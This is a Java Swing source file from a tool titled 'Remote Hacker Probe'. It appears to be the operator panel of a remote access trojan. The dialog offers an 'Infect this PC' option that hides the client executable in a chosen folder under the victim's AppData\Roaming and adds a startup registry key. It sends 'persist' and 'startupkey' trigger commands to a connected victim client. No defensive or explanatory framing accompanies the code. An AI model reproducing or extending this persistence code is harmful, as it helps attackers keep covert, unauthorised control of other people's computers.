package rhp;

import java.awt.BorderLayout;
import java.awt.FlowLayout;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.JCheckBox;
import java.awt.Font;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.util.concurrent.TimeUnit;

import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTextField;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

public class Persist extends JDialog {

	private final JPanel contentPanel = new JPanel();
	private JTextField hiddenfoldername;
	private JTextField fullpth;
	String username;
	int CLIENT_ID;
	private JTextField hiddenfilename;
	JCheckBox infect;
	private JTextField keyname;

	/**
	 * Create the dialog.
	 */
	public Persist() {
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setTitle("Remote Hacker Probe | Persistence");
		setResizable(false);
		setBounds(100, 100, 416, 241);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		contentPanel.setLayout(null);
		
		infect = new JCheckBox("Infect this PC");
		infect.setFont(new Font("Calibri", Font.PLAIN, 12));
		infect.setBounds(6, 7, 388, 25);
		infect.addItemListener(new ItemListener() {
		    @Override
		    public void itemStateChanged(ItemEvent e) {
		        if(e.getStateChange() == ItemEvent.SELECTED) {//checkbox has been selected
		            hiddenfoldername.setEditable(true);
		            hiddenfilename.setEditable(true);
		        } else {
		        	hiddenfoldername.setEditable(false);
		        	hiddenfilename.setEditable(false);
		        };
		    }
		});
		contentPanel.add(infect);
		
		JLabel lblNewLabel = new JLabel("Hidden Folder name : ");
		lblNewLabel.setToolTipText("Hidden Folder name. The folder name to use when infecting the PC.");
		lblNewLabel.setFont(new Font("Calibri", Font.PLAIN, 12));
		lblNewLabel.setBounds(10, 80, 128, 14);
		contentPanel.add(lblNewLabel);
		
		hiddenfoldername = new JTextField();
		hiddenfoldername.setEditable(false);
		hiddenfoldername.setFont(new Font("Consolas", Font.PLAIN, 13));
		hiddenfoldername.setBounds(143, 76, 251, 23);
		contentPanel.add(hiddenfoldername);
		hiddenfoldername.setColumns(10);
		hiddenfoldername.getDocument().addDocumentListener(new DocumentListener() {
			  public void changedUpdate(DocumentEvent e) {
			    //System.out.println("changedupdate");
			  }

			@Override
			public void insertUpdate(DocumentEvent e) {
				// TODO Auto-generated method stub
				if(hiddenfilename.getText().length() > 0)
				{
					String filename = hiddenfilename.getText();
					String foldername = hiddenfoldername.getText();
				    fullpth.setText("C:\\Users\\" + username +"\\AppData\\Roaming\\" +foldername + "\\" + filename + ".exe");
				}
				
			    //System.out.println("insertUpdate");
				
			}

			@Override
			public void removeUpdate(DocumentEvent e) {
				// TODO Auto-generated method stub
				//System.out.println("removeUpdate");
				
			}
		
			});
		
		JLabel lblNewLabel_1 = new JLabel("Probe will hide in : ");
		lblNewLabel_1.setFont(new Font("Calibri", Font.PLAIN, 12));
		lblNewLabel_1.setBounds(10, 114, 114, 14);
		contentPanel.add(lblNewLabel_1);
		
		fullpth = new JTextField();
		fullpth.setToolTipText("Full Path to where the Client will be installed.");
		fullpth.setEditable(false);
		fullpth.setFont(new Font("Consolas", Font.PLAIN, 12));
		fullpth.setBounds(143, 110, 251, 23);
		contentPanel.add(fullpth);
		fullpth.setColumns(10);
		
		JCheckBox addkey = new JCheckBox("Add Startup Key ");
		addkey.setSelected(true);
		addkey.setFont(new Font("Calibri", Font.PLAIN, 12));
		addkey.setBounds(6, 135, 388, 23);
		addkey.addItemListener(new ItemListener() {
		    @Override
		    public void itemStateChanged(ItemEvent e) {
		        if(e.getStateChange() == ItemEvent.SELECTED) {
		            keyname.setEditable(true);
		        } else {
		        	 keyname.setEditable(false);
		        };
		    }
		});
		contentPanel.add(addkey);
		
		JButton btnNewButton = new JButton("Go");
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if(infect.isSelected())
				{
					if(hiddenfilename.getText().length() > 0)
					{
						if(hiddenfoldername.getText().length() > 0)
						{
							if(hiddenfilename.getText().contains(" ")) {
								JOptionPane.showMessageDialog(null, "Filename must not contain spaces.", "Error", 0, null);
							} else if(hiddenfilename.getText().contains(":")) {
								JOptionPane.showMessageDialog(null, "Filename must not Colons or semicolons.", "Error", 0, null);
							} else {
								// Infect the pc
								String foldername = hiddenfoldername.getText();
								String filename = hiddenfilename.getText() + ".exe";
								String trigger = "persist:"  + foldername + ":" + filename;
								
								Server.SendData(Server.Clients.get(CLIENT_ID), trigger);
								ServerThread.WaitForReply();
							}
						}
					}
					
					else {
						JOptionPane.showMessageDialog(null, "One or more values have been left empty.", "Error", 0, null);
					}
				} 
				
				
				if(addkey.isSelected())
				{
					try {
						TimeUnit.SECONDS.sleep(1);
					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					String KeyName = keyname.getText();
					String fullpath = fullpth.getText();
					
					if(KeyName.length() > 0)
					{
						if(fullpath.length() > 0)
						{
							if(infect.isSelected())
							{
								String triggerKey = "startupkey=" + fullpath + "=" + KeyName;
								Server.SendData(Server.Clients.get(CLIENT_ID), triggerKey);
								ServerThread.WaitForReply();
							}
						} else {
							String triggerKey = "startupkey=NULL=" + KeyName;
							Server.SendData(Server.Clients.get(CLIENT_ID), triggerKey);
							ServerThread.WaitForReply();
						}
					} else {
						JOptionPane.showMessageDialog(null, "One or more values have been left empty.", "Error", 0, null);
					}
					
				}
				
			}
		});
		btnNewButton.setFont(new Font("Calibri", Font.PLAIN, 12));
		btnNewButton.setBounds(305, 168, 89, 23);
		contentPanel.add(btnNewButton);
		
		JLabel hiddenfl = new JLabel("Hidden File Name : ");
		hiddenfl.setFont(new Font("Calibri", Font.PLAIN, 12));
		hiddenfl.setBounds(10, 47, 114, 14);
		contentPanel.add(hiddenfl);
		
		hiddenfilename = new JTextField();
		hiddenfilename.setToolTipText("Hidden File name. The filename to use when infecting the PC.");
		hiddenfilename.setFont(new Font("Consolas", Font.PLAIN, 12));
		hiddenfilename.setEditable(false);
		hiddenfilename.setBounds(143, 39, 251, 23);
		contentPanel.add(hiddenfilename);
		hiddenfilename.setColumns(10);
		
		JLabel lblNewLabel_2 = new JLabel("Key name : ");
		lblNewLabel_2.setFont(new Font("Calibri", Font.PLAIN, 12));
		lblNewLabel_2.setBounds(14, 172, 67, 14);
		contentPanel.add(lblNewLabel_2);
		
		keyname = new JTextField();
		keyname.setToolTipText("The name to use when adding a startup key.");
		keyname.setFont(new Font("Consolas", Font.PLAIN, 12));
		keyname.setBounds(75, 165, 220, 26);
		contentPanel.add(keyname);
		keyname.setColumns(10);
	}
}
